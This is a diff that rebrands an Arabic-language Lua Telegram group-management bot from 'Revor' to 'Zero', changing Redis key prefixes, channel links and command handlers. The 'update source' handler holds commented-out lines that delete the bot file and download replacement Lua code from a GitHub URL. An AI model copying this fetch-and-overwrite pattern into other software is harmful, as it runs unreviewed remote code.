 end
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙تم استرجاع المجموعات من نسخه تشاكي')
@@ -2077,8 +2080,8 @@ if text == 'تحديث السورس' or text == 'تحديث السورس ⌔' th
 if not msg.ControllerBot then 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
---os.execute('rm -rf Revor.lua')
---download('https://raw.githubusercontent.com/Revor2/Revor/master/Revor.lua','Revor.lua')
+--os.execute('rm -rf Zero.lua')
+--download('https://raw.githubusercontent.com/ZeroTeam0/Zero/main/Zero.lua','Zero.lua')
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙تم تحديث السورس * ',"md",true)  
 end
 if text == 'تعطيل الاذاعه ⌔' or text == 'تعطيل الاذاعه' then
@@ -2086,10 +2089,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:SendBcBot") 
+Redis:del(Zero .."Zero :SendBcBot") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل الاذاعه ","md",true)
 end
 if text == 'تفعيل الاذاعه ⌔' or text == 'تفعيل الاذاعه' then
@@ -2097,10 +2100,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:SendBcBot",true) 
+Redis:set(Zero .."Zero :SendBcBot",true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل الاذاعه للمطورين ","md",true)
 end
 if text == 'تعطيل المغادره ⌔' or text == 'تعطيل المغادره' then
@@ -2108,10 +2111,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:LeftBot") 
+Redis:del(Zero .."Zero :LeftBot") 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل المغادره ","md",true)
 end
 if text == 'تفعيل المغادره ⌔' or text == 'تفعيل المغادره' then
@@ -2119,18 +2122,18 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:LeftBot",true) 
+Redis:set(Zero .."Zero :LeftBot",true) 
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تفعيل المغادره للمطورين ","md",true)
 end
-if (Redis:get(Revor.."Revor:AddSudosNew"..msg_chat_id) == 'true') then
+if (Redis:get(Zero .."Zero :AddSudosNew"..msg_chat_id) == 'true') then
 if text == "الغاء" or text == 'الغاء الامر ⌔' then   
-Redis:del(Revor.."Revor:AddSudosNew"..msg_chat_id)
+Redis:del(Zero .."Zero :AddSudosNew"..msg_chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id, "\n⌔︙تم الغاء امر تغيير المطور الاساسي","md",true)    
 end 
-Redis:del(Revor.."Revor:AddSudosNew"..msg_chat_id)
+Redis:del(Zero .."Zero :AddSudosNew"..msg_chat_id)
 if text and text:match("^@[%a%d_]+$") then
 local UserId_Info = LuaTele.searchPublicChat(text)
 if not UserId_Info.id then
@@ -2159,7 +2162,7 @@ if text == 'تغيير المطور الاساسي' or text == 'تغيير ال�
 if not msg.ControllerBot then 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
-Redis:set(Revor.."Revor:AddSudosNew"..msg_chat_id,true)
+Redis:set(Zero .."Zero :AddSudosNew"..msg_chat_id,true)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل معرف المطور الاساسي مع @","md",true)
 end
 if text == 'جلب النسخه الاحتياطيه ⌔' or text == 'جلب نسخه احتياطيه' then
@@ -2167,12 +2170,12 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Groups = Redis:smembers(Revor..'Revor:ChekBotAdd')  
-local UsersBot = Redis:smembers(Revor..'Revor:Num:User:Pv')  
-local Get_Json = '{"BotId": '..Revor..','  
+local Groups = Redis:smembers(Zero ..'Zero :ChekBotAdd')  
+local UsersBot = Redis:smembers(Zero ..'Zero :Num:User:Pv')  
+local Get_Json = '{"BotId": '..Zero ..','  
 if #UsersBot ~= 0 then 
 Get_Json = Get_Json..'"UsersBot":['  
 for k,v in pairs(UsersBot) do
@@ -2186,11 +2189,11 @@ Get_Json = Get_Json..']'
 end
 Get_Json = Get_Json..',"GroupsBot":{'
 for k,v in pairs(Groups) do   
-local President = Redis:smembers(Revor.."Revor:TheBasics:Group"..v)
-local Constructor = Redis:smembers(Revor.."Revor:Originators:Group"..v)
-local Manager = Redis:smembers(Revor.."Revor:Managers:Group"..v)
-local Admin = Redis:smembers(Revor.."Revor:Addictive:Group"..v)
-local Vips = Redis:smembers(Revor.."Revor:Distinguished:Group"..v)
+local President = Redis:smembers(Zero .."Zero :TheBasics:Group"..v)
+local Constructor = Redis:smembers(Zero .."Zero :Originators:Group"..v)
+local Manager = Redis:smembers(Zero .."Zero :Managers:Group"..v)
+local Admin = Redis:smembers(Zero .."Zero :Addictive:Group"..v)
+local Vips = Redis:smembers(Zero .."Zero :Distinguished:Group"..v)
 if k == 1 then
 Get_Json = Get_Json..'"'..v..'":{'
 else
@@ -2264,20 +2267,20 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor..'Revor:Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
+Redis:set(Zero ..'Zero :Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
 LuaTele.sendText(msg_chat_id,msg_id,'*⌔︙ تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعين عدد الاعضاء (%d+)$")..' عضو *',"md",true)  
 elseif text =='الاحصائيات' then 
 if not msg.ControllerBot then 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-LuaTele.sendText(msg_chat_id,msg_id,'*⌔︙عدد احصائيات البوت الكامله \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n⌔︙عدد المجموعات : '..(Redis:scard(Revor..'Revor:ChekBotAdd') or 0)..'\n⌔︙عدد المشتركين : '..(Redis:scard(Revor..'Revor:Num:User:Pv') or 0)..'*',"md",true)  
+LuaTele.sendText(msg_chat_id,msg_id,'*⌔︙عدد احصائيات البوت الكامله \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n⌔︙عدد المجموعات : '..(Redis:scard(Zero ..'Zero :ChekBotAdd') or 0)..'\n⌔︙عدد المشتركين : '..(Redis:scard(Zero ..'Zero :Num:User:Pv') or 0)..'*',"md",true)  
 end
 if text == 'تفعيل' and msg.Developers then
 if msg.can_be_deleted_for_all_users == false then
@@ -2285,9 +2288,9 @@ return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرآ البوت ليس 
 end
 local Get_Chat = LuaTele.getChat(msg_chat_id)
 local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
-if Redis:sismember(Revor.."Revor:ChekBotAdd",msg_chat_id) then
-if tonumber(Info_Chats.member_count) < tonumber((Redis:get(Revor..'Revor:Num:Add:Bot') or 0)) and not msg.ControllerBot then
-return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد الاعضاء قليل لا يمكن تفعيل المجموعه  يجب ان يكوم اكثر من :'..Redis:get(Revor..'Revor:Num:Add:Bot'),"md",true)  
+if Redis:sismember(Zero .."Zero :ChekBotAdd",msg_chat_id) then
+if tonumber(Info_Chats.member_count) < tonumber((Redis:get(Zero ..'Zero :Num:Add:Bot') or 0)) and not msg.ControllerBot then
+return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد الاعضاء قليل لا يمكن تفعيل المجموعه  يجب ان يكوم اكثر من :'..Redis:get(Zero ..'Zero :Num:Add:Bot'),"md",true)  
 end
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n⌔︙تم تفعيلها مسبقا *',"md",true)  
 else
@@ -2321,8 +2324,8 @@ data = {
 }
 LuaTele.sendText(Sudo_Id,0,'*\n⌔︙تم تفعيل مجموعه جديده \n⌔︙من قام بتفعيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n⌔︙معلومات المجموعه :\n⌔︙عدد الاعضاء : '..Info_Chats.member_count..'\n⌔︙عدد الادمنيه : '..Info_Chats.administrator_count..'\n⌔︙عدد المطرودين : '..Info_Chats.banned_count..'\n🔕︙عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
 end
-Redis:sadd(Revor.."Revor:ChekBotAdd",msg_chat_id)
-Redis:set(Revor.."Revor:Status:Id"..msg_chat_id,true) ;Redis:set(Revor.."Revor:Status:Reply"..msg_chat_id,true) ;Redis:set(Revor.."Revor:Status:ReplySudo"..msg_chat_id,true) ;Redis:set(Revor.."Revor:Status:BanId"..msg_chat_id,true) ;Redis:set(Revor.."Revor:Status:SetId"..msg_chat_id,true) 
+Redis:sadd(Zero .."Zero :ChekBotAdd",msg_chat_id)
+Redis:set(Zero .."Zero :Status:Id"..msg_chat_id,true) ;Redis:set(Zero .."Zero :Status:Reply"..msg_chat_id,true) ;Redis:set(Zero .."Zero :Status:ReplySudo"..msg_chat_id,true) ;Redis:set(Zero .."Zero :Status:BanId"..msg_chat_id,true) ;Redis:set(Zero .."Zero :Status:SetId"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n⌔︙تم تفعيل المجموعه *','md', true, false, false, false, reply_markup)
 end
 end 
@@ -2341,14 +2344,14 @@ end
 if AddedBot == false then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرا انته لست ادمن او مالك المجموعه *","md",true)  
 end
-if not Redis:get(Revor.."Revor:BotFree") then
+if not Redis:get(Zero .."Zero :BotFree") then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙الوضع الخدمي تم تعطيله من قبل مطور البوت *","md",true)  
 end
 local Get_Chat = LuaTele.getChat(msg_chat_id)
 local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
-if Redis:sismember(Revor.."Revor:ChekBotAdd",msg_chat_id) then
-if tonumber(Info_Chats.member_count) < tonumber((Redis:get(Revor..'Revor:Num:Add:Bot') or 0)) and not msg.ControllerBot then
-return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد الاعضاء قليل لا يمكن تفعيل المجموعه  يجب ان يكوم اكثر من :'..Redis:get(Revor..'Revor:Num:Add:Bot'),"md",true)  
+if Redis:sismember(Zero .."Zero :ChekBotAdd",msg_chat_id) then
+if tonumber(Info_Chats.member_count) < tonumber((Redis:get(Zero ..'Zero :Num:Add:Bot') or 0)) and not msg.ControllerBot then
+return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد الاعضاء قليل لا يمكن تفعيل المجموعه  يجب ان يكوم اكثر من :'..Redis:get(Zero ..'Zero :Num:Add:Bot'),"md",true)  
 end
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n⌔︙تم تفعيلها مسبقا *',"md",true)  
 else
@@ -2382,8 +2385,8 @@ data = {
 },
 }
 }
-Redis:sadd(Revor.."Revor:ChekBotAdd",msg_chat_id)
-Redis:set(Revor.."Revor:Status:Id"..msg_chat_id,true) ;Redis:set(Revor.."Revor:Status:Reply"..msg_chat_id,true) ;Redis:set(Revor.."Revor:Status:ReplySudo"..msg_chat_id,true) ;Redis:set(Revor.."Revor:Status:BanId"..msg_chat_id,true) ;Redis:set(Revor.."Revor:Status:SetId"..msg_chat_id,true) 
+Redis:sadd(Zero .."Zero :ChekBotAdd",msg_chat_id)
+Redis:set(Zero .."Zero :Status:Id"..msg_chat_id,true) ;Redis:set(Zero .."Zero :Status:Reply"..msg_chat_id,true) ;Redis:set(Zero .."Zero :Status:ReplySudo"..msg_chat_id,true) ;Redis:set(Zero .."Zero :Status:BanId"..msg_chat_id,true) ;Redis:set(Zero .."Zero :Status:SetId"..msg_chat_id,true) 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n⌔︙تم تفعيل المجموعه *','md', true, false, false, false, reply_markup)
 end
 end
@@ -2391,7 +2394,7 @@ end
 if text == 'تعطيل' and msg.Developers then
 local Get_Chat = LuaTele.getChat(msg_chat_id)
 local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
-if not Redis:sismember(Revor.."Revor:ChekBotAdd",msg_chat_id) then
+if not Redis:sismember(Zero .."Zero :ChekBotAdd",msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n⌔︙تم تعطيلها مسبقا *',"md",true)  
 else
 if not msg.ControllerBot then
@@ -2410,7 +2413,7 @@ data = {
 }
 LuaTele.sendText(Sudo_Id,0,'*\n⌔︙تم تعطيل مجموعه جديده \n⌔︙من قام بتعطيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n⌔︙معلومات المجموعه :\n⌔︙عدد الاعضاء : '..Info_Chats.member_count..'\n⌔︙عدد الادمنيه : '..Info_Chats.administrator_count..'\n⌔︙عدد المطرودين : '..Info_Chats.banned_count..'\n🔕︙عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
 end
-Redis:srem(Revor.."Revor:ChekBotAdd",msg_chat_id)
+Redis:srem(Zero .."Zero :ChekBotAdd",msg_chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n⌔︙تم تعطيلها بنجاح *','md',true)
 end
 end
@@ -2428,7 +2431,7 @@ return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙عذرا انته لست ا
 end
 local Get_Chat = LuaTele.getChat(msg_chat_id)
 local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
-if not Redis:sismember(Revor.."Revor:ChekBotAdd",msg_chat_id) then
+if not Redis:sismember(Zero .."Zero :ChekBotAdd",msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n⌔︙تم تعطيلها مسبقا *',"md",true)  
 else
 if not msg.ControllerBot then
@@ -2447,25 +2450,25 @@ data = {
 }
 LuaTele.sendText(Sudo_Id,0,'*\n⌔︙تم تعطيل مجموعه جديده \n⌔︙من قام بتعطيلها : {*['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')*} \n⌔︙معلومات المجموعه :\n⌔︙عدد الاعضاء : '..Info_Chats.member_count..'\n⌔︙عدد الادمنيه : '..Info_Chats.administrator_count..'\n⌔︙عدد المطرودين : '..Info_Chats.banned_count..'\n⌔︙عدد المقيدين : '..Info_Chats.restricted_count..'*',"md",true, false, false, false, reply_markup)
 end
-Redis:srem(Revor.."Revor:ChekBotAdd",msg_chat_id)
+Redis:srem(Zero .."Zero :ChekBotAdd",msg_chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙المجموعه : {*['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')*}\n⌔︙تم تعطيلها بنجاح *','md',true)
 end
 end
-if chat_type(msg.chat_id) == "GroupBot" and Redis:sismember(Revor.."Revor:ChekBotAdd",msg_chat_id) then
+if chat_type(msg.chat_id) == "GroupBot" and Redis:sismember(Zero .."Zero :ChekBotAdd",msg_chat_id) then
 if text == "ايدي" and msg.reply_to_message_id == 0 then
-if not Redis:get(Revor.."Revor:Status:Id"..msg_chat_id) then
+if not Redis:get(Zero .."Zero :Status:Id"..msg_chat_id) then
 return false
 end
 local UserInfo = LuaTele.getUser(msg.sender.user_id)
 local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
 local UserId = msg.sender.user_id
 local RinkBot = msg.Name_Controller
-local TotalMsg = Redis:get(Revor..'Revor:Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
+local TotalMsg = Redis:get(Zero ..'Zero :Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
 local TotalPhoto = photo.total_count or 0
-local TotalEdit = Redis:get(Revor..'Revor:Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
+local TotalEdit = Redis:get(Zero ..'Zero :Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
 local TotalMsgT = Total_message(TotalMsg) 
-local NumberGames = Redis:get(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id) or 0
-local NumAdd = Redis:get(Revor.."Revor:Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0
+local NumberGames = Redis:get(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id) or 0
+local NumAdd = Redis:get(Zero .."Zero :Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0
 local Texting = {'ملاك وناسيك بكروبنه😟',"حلغوم والله☹️ ","اطلق صوره🐼❤️","كيكك والله🥺","لازك بيها غيرها عاد😒",}
 local Description = Texting[math.random(#Texting)]
 if UserInfo.username then
@@ -2473,8 +2476,8 @@ UserInfousername = '@'..UserInfo.username..''
 else
 UserInfousername = 'لا يوجد'
 end
-Get_Is_Id = Redis:get(Revor.."Revor:Set:Id:Groups") or Redis:get(Revor.."Revor:Set:Id:Group"..msg_chat_id)
-if Redis:get(Revor.."Revor:Status:IdPhoto"..msg_chat_id) then
+Get_Is_Id = Redis:get(Zero .."Zero :Set:Id:Groups") or Redis:get(Zero .."Zero :Set:Id:Group"..msg_chat_id)
+if Redis:get(Zero .."Zero :Status:IdPhoto"..msg_chat_id) then
 if Get_Is_Id then
 local Get_Is_Id = Get_Is_Id:gsub('#AddMem',NumAdd) 
 local Get_Is_Id = Get_Is_Id:gsub('#id',msg.sender.user_id) 
@@ -2549,11 +2552,11 @@ UserInfousername = 'لا يوجد'
 end
 local UserId = Message_Reply.sender.user_id
 local RinkBot = Controller(msg_chat_id,UserId)
-local TotalMsg = Redis:get(Revor..'Revor:Num:Message:User'..msg_chat_id..':'..UserId) or 0
-local TotalEdit = Redis:get(Revor..'Revor:Num:Message:Edit'..msg_chat_id..UserId) or 0
+local TotalMsg = Redis:get(Zero ..'Zero :Num:Message:User'..msg_chat_id..':'..UserId) or 0
+local TotalEdit = Redis:get(Zero ..'Zero :Num:Message:Edit'..msg_chat_id..UserId) or 0
 local TotalMsgT = Total_message(TotalMsg) 
-local NumAdd = Redis:get(Revor.."Revor:Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
-local NumberGames = Redis:get(Revor.."Revor:Num:Add:Games"..msg.chat_id..UserId) or 0
+local NumAdd = Redis:get(Zero .."Zero :Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
+local NumberGames = Redis:get(Zero .."Zero :Num:Add:Games"..msg.chat_id..UserId) or 0
 if Get_Is_Id then
 local Get_Is_Id = Get_Is_Id:gsub('#AddMem',NumAdd) 
 local Get_Is_Id = Get_Is_Id:gsub('#id',UserId) 
@@ -2589,11 +2592,11 @@ return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع �
 end
 local UserId = UserId_Info.id
 local RinkBot = Controller(msg_chat_id,UserId_Info.id)
-local TotalMsg = Redis:get(Revor..'Revor:Num:Message:User'..msg_chat_id..':'..UserId) or 0
-local TotalEdit = Redis:get(Revor..'Revor:Num:Message:Edit'..msg_chat_id..UserId) or 0
+local TotalMsg = Redis:get(Zero ..'Zero :Num:Message:User'..msg_chat_id..':'..UserId) or 0
+local TotalEdit = Redis:get(Zero ..'Zero :Num:Message:Edit'..msg_chat_id..UserId) or 0
 local TotalMsgT = Total_message(TotalMsg) 
-local NumAdd = Redis:get(Revor.."Revor:Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
-local NumberGames = Redis:get(Revor.."Revor:Num:Add:Games"..msg.chat_id..UserId) or 0
+local NumAdd = Redis:get(Zero .."Zero :Num:Add:Memp"..msg.chat_id..":"..UserId) or 0
+local NumberGames = Redis:get(Zero .."Zero :Num:Add:Games"..msg.chat_id..UserId) or 0
 if Get_Is_Id then
 local Get_Is_Id = Get_Is_Id:gsub('#AddMem',NumAdd) 
 local Get_Is_Id = Get_Is_Id:gsub('#id',UserId) 
@@ -2632,8 +2635,8 @@ StatusMemberChat = 'عظو في المجموعه'
 end
 local UserId = msg.sender.user_id
 local RinkBot = msg.Name_Controller
-local TotalMsg = Redis:get(Revor..'Revor:Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
-local TotalEdit = Redis:get(Revor..'Revor:Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
+local TotalMsg = Redis:get(Zero ..'Zero :Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
+local TotalEdit = Redis:get(Zero ..'Zero :Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
 local TotalMsgT = Total_message(TotalMsg) 
 if UserInfo.username then
 UserInfousername = '@'..UserInfo.username..''
@@ -2677,14 +2680,14 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local StatusMember = LuaTele.getChatMember(msg_chat_id,Revor).status.luatele
+local StatusMember = LuaTele.getChatMember(msg_chat_id,Zero ).status.luatele
 if (StatusMember ~= "chatMemberStatusAdministrator") then
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙البوت عضو في المجموعه ',"md",true) 
 end
-local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,Revor).status
+local GetMemberStatus = LuaTele.getChatMember(msg_chat_id,Zero ).status
 if GetMemberStatus.can_change_info then
 change_info = '❬ ✔️ ❭' else change_info = '❬ ❌ ❭'
 end
@@ -2713,7 +2716,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -2751,13 +2754,13 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:DevelopersQ:Groups",UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :DevelopersQ:Groups",UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله مطور ثانوي مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:DevelopersQ:Groups",UserId_Info.id) 
+Redis:srem(Zero .."Zero :DevelopersQ:Groups",UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله مطور ثانوي").Reply,"md",true)  
 end
 end
@@ -2766,13 +2769,13 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not Redis:sismember(Revor.."Revor:Developers:Groups",UserId_Info.id) then
+if not Redis:sismember(Zero .."Zero :Developers:Groups",UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله مطور مسبقا ").Reply,"md",true)  
 else
-Redis:srem(Revor.."Revor:Developers:Groups",UserId_Info.id) 
+Redis:srem(Zero .."Zero :Developers:Groups",UserId_Info.id) 
